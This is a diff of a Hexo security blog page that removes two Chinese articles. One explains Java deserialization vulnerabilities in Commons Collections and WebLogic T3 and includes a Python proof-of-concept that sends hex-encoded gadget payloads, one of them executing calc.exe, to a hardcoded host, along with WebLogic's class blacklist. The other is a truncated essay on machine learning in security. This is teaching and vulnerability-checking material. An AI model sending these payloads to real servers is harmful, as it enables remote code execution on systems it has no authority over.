@@ -51,9 +51,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
@@ -63,206 +63,6 @@
 </header>
       <div class="outer">
         <section id="main">
-  
-    <article id="w-Java反序列化漏洞" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/09/10/Java反序列化漏洞/" class="article-date">
-  <time datetime="2017-09-10T03:46:54.000Z" itemprop="datePublished">2017-09-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/09/10/Java反序列化漏洞/">序列化和反序列化</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://xianzhi.aliyun.com/forum/topic/1825/" target="_blank" rel="external">先知首发地址</a></p>
-<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>序列化：把对象转换为字节序列的过程。<br>反序列化：把字节序列恢复为对象的过程。<br><img src="/upload_image/7.png" alt=""></p>
-<h5 id="JDK类库中的序列化API"><a href="#JDK类库中的序列化API" class="headerlink" title="JDK类库中的序列化API"></a>JDK类库中的序列化API</h5><p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。<br>　　java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br><img src="/upload_image/8.png" alt=""><br><strong>在Java中，对象的序列化与反序列化被广泛应用到RMI(远程方法调用)及网络传输中。</strong></p>
-<h5 id="Java序列化数据解析"><a href="#Java序列化数据解析" class="headerlink" title="Java序列化数据解析"></a>Java序列化数据解析</h5><p>数据开头为“AC ED 00 05”，数据内容包含了包名与类名、类中包含的变量名称、类型及变量的值。<br><img src="/upload_image/9.png" alt=""><br>ava.io.ObjectStreamConstants类中定义了STREAM_MAGIC与STREAM_VERSION，查看JDK1.5、1.6、1.7、1.8的ObjectStreamConstants类，STREAM_MAGIC值均为0xaced，STREAM_VERSION值均为5。</p>
-<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Breenmachine的这篇blog让java反序列化漏洞得到更多的关注，他介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。<br><img src="/upload_image/10.png" alt=""></p>
-<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>如果Java应用对用户输入，即不可信数据没有进行校验而直接做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p>
-<h3 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。<br>该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法，并且该方法在相关对象反序列化时并未进行任何校验.<br>Apache Commons Collections中提供了一个Transformer的类，这个接口的的功能就是把一个对象转换为另一个对象。<br><img src="/upload_image/11.png" alt=""><br>图上红框标注的是java反序列化漏洞的poc包含的类。<br>invokeTransformer：Transformer implementation that creates a new object instance by reflection.（通过反射，返回一个对象）<br>ChainedTransformer：Transformer implementation that chains the specified transformers together.（把transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）<br>ConstantTransformer：Transformer implementation that returns the same constant each time.（把一个对象转化为常量，并返回）<br>InvokerTransformer是比较关键的一个类，我们来看看它的实现：<br><img src="/upload_image/18.png" alt=""><br>我们可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象(反射机制就是可以把一个类,类的成员(函数,属性),当成一个对象来操作,希望读者能理解,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们.)，iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型，iArgs为对应方法的参数，在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数<br>POC：<br><img src="/upload_image/17.png" alt=""><br>Poc解读：整个poc的逻辑可以这么理解，构建innerMap的键值对，为其赋值，利用Transformed的decorate方法，可以对Map数据结构的key，value进行transform。该方法有三个参数，第一个为待转化的map对象，第二个为map对象内的key要经过的转化方法，第三个参数为map对象内的value要经过的转化方法。<br>TransformedMap.decoreate(目标map，key的转化对象（null或者单个链），value的转化对象)<br>poc对innerMap的value进行转换，当innerMap的value执行完一个完整的转换链，就完成了命令执行。</p>
-<p>如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。那如何让Java应用触发Transformer的变换呢？<br>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。<br>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。<br>我们观察到java运行库中有这样一个类AnnotationInvocationHandler，这个类有一个成员变量memberValues是Map类型.<br><img src="/upload_image/16.png" alt=""><br>AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数。<br><img src="/upload_image/20.png" alt=""><br>因此，我们只需要使用前面构造的Map来构造AnnotationInvocationHandler，进行序列化，当触发readObject()反序列化的时候，就能实现命令执行。<br>这段POC本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((Runtime)Runtime.class.getMethod(<span class="string">"getRuntime"</span>,null).invoke(null,null)).<span class="built_in">exec</span>(<span class="string">"calc.exe"</span>);</div></pre></td></tr></table></figure></p>
-<h3 id="Weblogic-Exploit"><a href="#Weblogic-Exploit" class="headerlink" title="Weblogic Exploit"></a>Weblogic Exploit</h3><p>Oracle Weblogic <strong>T3</strong> Deserialization Remote Code Execution Vulnerability<br>CVE-2015-4852<br>CVE-2016-0638<br>CVE-2016-3510<br>CVE-2017-3248<br>weblogic 采用T3协议进行序列化数据的传输，可以看到weblogic发送的JAVA序列化数据分为6个部分，第一部分的前四个字节为整个数据包的长度，第2-6部分均为JAVA序列化数据。经测试，必须先发送T3协议头数据包，再发送JAVA序列化数据包，才能使weblogic进行JAVA反序列化，进而触发漏洞。如果只发送JAVA序列化数据包，不先发送T3协议头数据包，无法触发漏洞。<br><img src="/upload_image/15.png" alt=""></p>
-<h5 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h5><p>blacklist<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">org.apache.commons.collections.functors*</div><div class="line">com.sun.org.apache.xalan.internal.xsltc.trax*</div><div class="line">javassist*</div><div class="line">org.codehaus.groovy.runtime.ConvertedClosure</div><div class="line">org.codehaus.groovy.runtime.ConversionHandler</div><div class="line">org.codehaus.groovy.runtime.MethodClosure</div></pre></td></tr></table></figure></p>
-<p>CVE-2015-4852的反序列化的点有三个：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</div><div class="line">weblogic.rjvm.MsgAbbrevInputStream.class</div><div class="line">weblogic.iiop.Utils.class</div></pre></td></tr></table></figure></p>
-<p>后面的几个漏洞实质都是对黑名单的一个绕过。</p>
-<h5 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h5><p>原理将反序列化的对象封装进了 weblogic.corba.utils.MarshalledObject，然后再对 MarshalledObject 进行序列化，生成 payload 字节码。反序列化时 MarshalledObject 不在 WebLogic 黑名单里，可正常反序列化，在反序列化时 MarshalledObject 对象调用 readObject 时对 MarshalledObject 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。</p>
-<h5 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h5><p>利用了黑名单之外的反序列化类，通过 JRMP 协议达到执行任意反序列化 payload。（Java远程消息交换协议 JRMP 即 Java Remote MessagingProtocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。）<br>下面给出一段在tenable找的描述<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">In the <span class="keyword">case</span> of WebLogic, we are interested <span class="keyword">in</span> yososerial<span class="string">'s JRMPListener.java payload. This serializes a RemoteObjectInvocationHandler which uses a UnicastRef object to establish a TCP connection to a remote server in order to get at the remote server'</span>s RMI registry. This connection uses JRMP so the client will deserialize whatever the server responds with, achieving unauthenticated remote code execution.</div><div class="line">Exploiting WebLogic</div><div class="line">To demonstrate the issue to ZDI and Oracle, Tenable created two scripts. The first script is a server that listens <span class="keyword">for</span> the callback, called jrmp_listener.py. When the connect back connects to jrmp_listener.py it will send a CommonCollections3 payload <span class="keyword">in</span> response <span class="built_in">which</span> will trigger the RCE on WebLogic. The second script sends the serialized object to WebLogic via t3 on TCP port 7001 (just like the original FoxGlove attack), called jrmp_connect_back.py. In order to exploit WebLogic, jrmp_listener.py must be executed before jrmp_connect_back.py. The result of the exploitation will cause the connect back, <span class="built_in">which</span> exists on its own thread, to be executed multiple <span class="built_in">times</span> (<span class="built_in">which</span> means an attacker could deliver multiple payloads).</div></pre></td></tr></table></figure></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用的步骤：<br>1.找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。<br>2.应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库也行）<br>3.使用ysoserial来生成反序列化的payload，指定库名和想要执行的命令即可。<br>4.通过先前找到的传入对象方式进行对象注入，数据中载入payload，触发受影响应用中ObjectInputStream的反序列化操作，随后通过反射调用Runtime.getRunTime.exec即可完成利用。<br>最关键的是用恶意的序列化数据去替换正常的序列化数据</p>
-<h5 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h5><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial</a><br><img src="/upload_image/16.png" alt=""><br>下面给出一个’CVE-2016-0638’,’CVE-2016-3510’,’CVE-2017-3248’的无害poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import socket</div><div class="line">import time</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#  @author iswin@threathunter.org</span></div><div class="line"><span class="comment">#  reffer: nessus</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">VUL=[<span class="string">'CVE-2016-0638'</span>,<span class="string">'CVE-2016-3510'</span>,<span class="string">'CVE-2017-3248'</span>]</div><div class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</div><div class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>,<span class="string">'org.apache.commons.collections.functors.InvokerTransformer'</span>,<span class="string">'\\$Proxy[0-9]+'</span>]</div><div class="line"></div><div class="line">def t3handshake(sock,server_addr):</div><div class="line">    sock.connect(server_addr)</div><div class="line">    sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(1)</div><div class="line">    sock.recv(1024)</div><div class="line">    <span class="built_in">print</span> <span class="string">'handshake successful'</span></div><div class="line"></div><div class="line">def buildT3RequestObject(sock,port):</div><div class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></div><div class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</div><div class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></div><div class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></div><div class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</div><div class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(2)</div><div class="line">    <span class="built_in">print</span> <span class="string">'send request payload successful,recv length:%d'</span>%(len(sock.recv(2048)))</div><div class="line"></div><div class="line"></div><div class="line">def sendEvilObjData(sock,data):</div><div class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></div><div class="line">    payload+=data</div><div class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></div><div class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/2 + 4),payload)</div><div class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</div><div class="line">    res = <span class="string">''</span></div><div class="line">    try:</div><div class="line">        <span class="keyword">while</span> True:</div><div class="line">            res += sock.recv(4096)</div><div class="line">            time.sleep(0.1)</div><div class="line">    except Exception as e:</div><div class="line">        pass</div><div class="line">    <span class="built_in">return</span> res</div><div class="line"></div><div class="line">def checkVul(res,server_addr,index):</div><div class="line">    p=re.findall(VER_SIG[index], res, re.S)</div><div class="line">    <span class="keyword">if</span> len(p)&gt;0:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is vul %s'</span>%(server_addr[0],server_addr[1],VUL[index])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is not vul %s'</span> % (server_addr[0],server_addr[1],VUL[index])</div><div class="line"></div><div class="line"></div><div class="line">def run(dip,dport,index):</div><div class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="comment">##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></div><div class="line">    sock.settimeout(50)</div><div class="line">    server_addr = (dip, dport)</div><div class="line">    t3handshake(sock,server_addr)</div><div class="line">    buildT3RequestObject(sock,dport)</div><div class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</div><div class="line">    checkVul(rs,server_addr,index)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    dip = <span class="string">'10.8.56.17'</span></div><div class="line">    dport = 7001</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(VUL)):</div><div class="line">        run(dip,dport,i)</div></pre></td></tr></table></figure></p>
-<p>漏洞验证环境可以用phith0n牛的weblogic环境：<a href="https://github.com/phith0n/vulhub/tree/master/weblogic/weak_password" target="_blank" rel="external">weak_password</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/09/10/Java反序列化漏洞/" data-id="cjc7iqrrg000a5s1bb6fvaift" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-机器学习再信息安全中的应用" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/08/11/机器学习再信息安全中的应用/" class="article-date">
-  <time datetime="2017-08-11T08:44:31.000Z" itemprop="datePublished">2017-08-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前段时间听了一个”机器学习在信息安全中的应用”的讲座，应该是我今年听关于机器学习在信息安全中的应用的最好的一场，研究嘉宾是kkqq大神，后来自己又做了一些思考，在此做一个总结。<br>在和黑客对抗的过程中，面对的威胁有3个不同的认知程度：<br>1.已知的威胁。<br>2.已知的未知的威胁。<br>3.未知的未知的威胁。<br>很多时候，在做产品、做运营和做研究的时，最大的恐惧是面对一个最未知的恐惧；因为只要知道这个情况是已知的，有很多技术手段都是可以解决的。<br>首先我们说一下如何定义和衡量已知和未知。从安全角度来说比较容易：<br>已知的已知就是我如果在做一个产品，我自己每天能看见的，能检测到的；<br>已知的未知就是我自己看不见，也检测不到，但是友商们都有检测；<br>未知的未知确实就是我不知道，除非它发生了，被通过某些机缘巧合的情况下暴露了出来，这个情况下，才会换成我们所谓的已知的未知。<br>做安全的，不管是甲方还是乙方，面临同样的挑战，就是一个事情只要我知道，我所有的分析，所有的IOC，所有的威胁情报都能跟上去，但如果这个事情我不知道，那真是无从下手。<br>其实在每一个层次上面，我们也可以横向定义到我们的产品，我们的运营上面去，我们怎么样去衡量你是不是在这个层次上做得比较好。<br>首先，要解决的是效果问题。这些效果包括我的检出率、召回率、误报率，就是这些不同的指标。但是更重要的是运营的，我怎么去衡量。不管你做任何的系统，你如果一天摔给我1000个报警，那我绝对不可能响应的过来的，所以运营就是事件可响应的数量不能太多。<br>每一个攻击来的时候，如果你不知道它背后是谁，那你这个其实还是没有解决到根本的问题。<br>我们用这个效果运营和知己知彼来衡量你在每个维度上到底能做到什么样的程度。</p>
-<h4 id="规则系统"><a href="#规则系统" class="headerlink" title="规则系统"></a>规则系统</h4><p>，我只需要写规则，我就能把这个问题解决掉。但是有一个坏处，严重依赖于安全专家，因为你要想把一个安全场景的检测逻辑转化到一个规则系统里面，你是需要人深入了解到清楚每一个环节。<br>规则系统，就是写规则嘛。它的误报率和检出率都是相对比较认可的，误报也是比较可控的，可运营的。我出了一个误报，我可以做到把这个规则删了就可以了，这样误报就没有了，不影响你整个架构。<br>存在的问题就是规则系统是严重依赖于你的专家的知识，天然的就限制了你的规则系统是基于被动响应的模式的，比如说杀毒软件，只有我有一个样本我才能写一套规则，而且要在过程中是严重依赖于分析师的。我们拿杀毒软件举例子，分析师说我需要确定一下这个家族有什么样的特征，为了很快的能做响应，它有很多烦琐的或者是特别重的自动化流程去做。<br>还是相对有一个好处，能很明确的告诉你，这是什么病毒，这个在有时候，尤其是在互联网企业做安全运营的时候是很重要的指标，因为我如果来了一个远控和我来了一个普通的刷流量的恶意软件，这个威胁程度在我们看来是不一样的。</p>
